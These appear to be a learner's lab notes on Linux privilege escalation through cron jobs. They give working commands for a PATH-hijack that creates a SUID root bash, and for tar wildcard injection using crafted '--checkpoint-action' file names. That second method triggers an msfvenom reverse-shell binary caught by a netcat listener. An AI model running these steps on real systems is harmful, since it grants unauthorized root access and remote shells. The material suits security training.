## Exploiting Crontab
​
Remember the path to success:
​

>[!Success]
>```
>/etc/crontab
>```

​
Take a look, bcuz could be some files executing and writeable for your user, then we can modify and attack.
​
​
### What if the file is not writeable but the PATH takes our home?
​
Imagine that the PATH variable starts with ==/home/user== which is our user's home directory.
​
Create a file called {the same way as the file running in cronjobs} in your home directory with the following contents:
​

>[!Tip] Chebra
>```
>#!/bin/bash
>cp /bin/bash /tmp/rootbash
>chmod +xs /tmp/rootbash
>```

​
Then ==chmod +x== and wait for the cronjob to run it. Finally, base on our little bash script, let's run the /tmp/rootbash command with -p to gain a shell running with root privileges.
​

>[!Tip] Chebra
>```
>/tmp/rootbash -p
>```

​
​
### And the Wildcards?
​
In this scenario we have an script been running by cronjob, so first we ==cat== it:
​

>[!Tip] Chebra
>```
>cat /usr/local/bin/compress.sh
>```

​
Imagine that the ==tar== command is being run with a wildcard (\*) in your home directory.
​
Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.
​
Use msfvenom to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
​

>[!Tip] Chebra
>```
>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
>```

​
Transfer the shell.elf file to **/home/user/** on the Debian VM (you can use **scp** or host the file on a webserver on your Kali box and use **wget**). Make sure the file is executable:
​

>[!Tip] Chebra
>```
>chmod +x /home/user/shell.elf
>```

​
Create these two files in /home/user:
​

>[!Tip] Chebra
>```
>touch /home/user/--checkpoint=1
>```
>```
>touch /home/user/--checkpoint-action=exec=shell.elf
>```

​
When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
​
Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.  
​

>[!Tip] Chebra
>```
>nc -nvlp 4444
>```

​
Then if want to remove all: remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
​
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf